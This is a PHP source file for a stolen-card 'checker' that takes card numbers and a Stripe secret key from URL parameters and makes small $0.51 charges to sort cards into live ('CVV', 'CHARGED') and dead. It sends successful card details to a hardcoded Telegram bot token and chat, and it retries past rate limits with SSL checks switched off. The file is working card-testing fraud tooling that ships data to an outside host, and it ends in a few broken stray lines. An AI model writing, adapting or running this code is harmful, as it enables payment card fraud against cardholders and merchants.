<?php



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function forward($text) {
    file_get_contents("https://api.telegram.org/bot5563749452:AAE09yEX4B5fcspVbA6WBvxSAAzSq53pt20/sendMessage?chat_id=-1001742449662&text=$text&parse_mode=HTML");
}

function forwardCVV($text) {
    file_get_contents("https://api.telegram.org/bot5563749452:AAE09yEX4B5fcspVbA6WBvxSAAzSq53pt20/sendMessage?chat_id=-1001742449662&text=$text&parse_mode=HTML");
}

//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '0.51';
	$chr = $amt * 100;
}

$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]=');
$result1 = curl_exec($ch);


$payment_decode = json_decode($result1, 1);
$payment_id = $payment_decode['id'];
$payment_error_code = $payment_decode['error']['code'];
$payment_decline_code = $payment_decode['error']['decline_code'];
$payment_message = $payment_decode['error']['message'];
$payment_cvc_check = $payment_decode['card']['cvc_check'];

$tok1 = Getstr($result1,'"id": "','"');
$msg = Getstr($result1,'"message": "','"');
//echo "<br><b>Result1: </b> $result1<br>";
if ($payment_error_code != 'rate_limit') {
    break;
}
}
#-------------------[2nd REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
if (isset($payment_id)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=USD&payment_method_types[]=card&description=Custom Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
 $result2 = curl_exec($ch);
$tok2 = Getstr($result2,'"id": "','"');
$msg = trim(strip_tags(getStr($result2,'"reason": "','"')));


$intent_decode = json_decode($result2, 1);
$intent_id = $intent_decode['id'];
$intent_error_code = $intent_decode['error']['code'];
$intent_decline_code = $intent_decode['error']['decline_code'];
$intent_message = $intent_decode['error']['message'];
}

############



if ($intent_error_code != 'rate_limit') {
    break;
}
}
################
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));

//=================== [ RESPONSES ] ===================//



if (strpos($result2, '"status": "succeeded"')) {
    echo "<font color=green>#CHARGED CCN</span> </span>CC:$cc|$mes|$ano</span>  <br>➤ Response: $.51 Charged ✅ <br> ➤ Receipt : <a href=$receipturl>Here</a> <br>";
    forwardCVV("$cc|$mes|$ano|000 ➟ CCN CHARGE 🔥");
    die();
}

if (!$payment_id) {
    if ($payment_error_code == 'insufficient_funds') {
        echo "<font color=blue>CVV</span>  </span>CC:$lista</span><br>[$retry]Result:$payment_decline_code</span> <br>";
    }
    else if ($payment_decline_code == 'insufficient_funds') {
        echo "<font color=blue>CVV</span>  </span>CC:$lista</span><br>[$retry]Result:$payment_decline_code</span> R1 <br>";
    }
    else if (strpos($payments, 'Invalid API Key provided')) {
        echo '<font color=red>DEAD</span>  </span>CC:$lista</span>  <br>Result: SK KEY <font color=red>DEAD OR INVALID R1</span><br>';
    }
    else if (!$payment_decline_code) {
        echo "<font color=red>DEAD</span>  </span>CC:$lista</span><br>[$retry]Result:$payment_decline_code</span> R1 <br>"; 
    }
    else {
        echo "<font color=red>DEAD</span>  </span>CC:$lista</span><br>[$retry]Result:$payment_decline_code</span> R1 <br>"; 
    }
    die();
}


if (!$intent_id) {
    if ($intent_error_code == 'insufficient_funds') {
        echo "<font color=blue>CVV</span>  </span>CC:$lista</span><br>[$retry]Result:$intent_decline_code</span> R2 <br>";
    }
    else if ($intent_decline_code == 'insufficient_funds') {
        echo "<font color=blue>CVV</span>  </span>CC:$lista</span><br>[$retry]Result:$intent_decline_code</span> R2 <br>";
    }
    else if ($intent_decline_code == 'transaction_not_allowed') {
        echo "<font color=blue>CVV</span>  </span>CC:$lista</span><br>[$retry]Result:$intent_decline_code</span> R2 <br>";
    }
    else if (!$intent_decline_code) {
        echo "<font color=red>DEAD</span>  </span>CC:$lista</span><br>[$retry]Result:$intent_decline_code</span> R2 <br>";
    }
    else {
        echo "<font color=red>DEAD</span>  </span>CC:$lista</span><br>[$retry]Result:$intent_decline_code</span> R2 <br>";
    }
    die();
}
' ' . $string.  ', <a href="something.php">New Page</a></span>';
?>
?>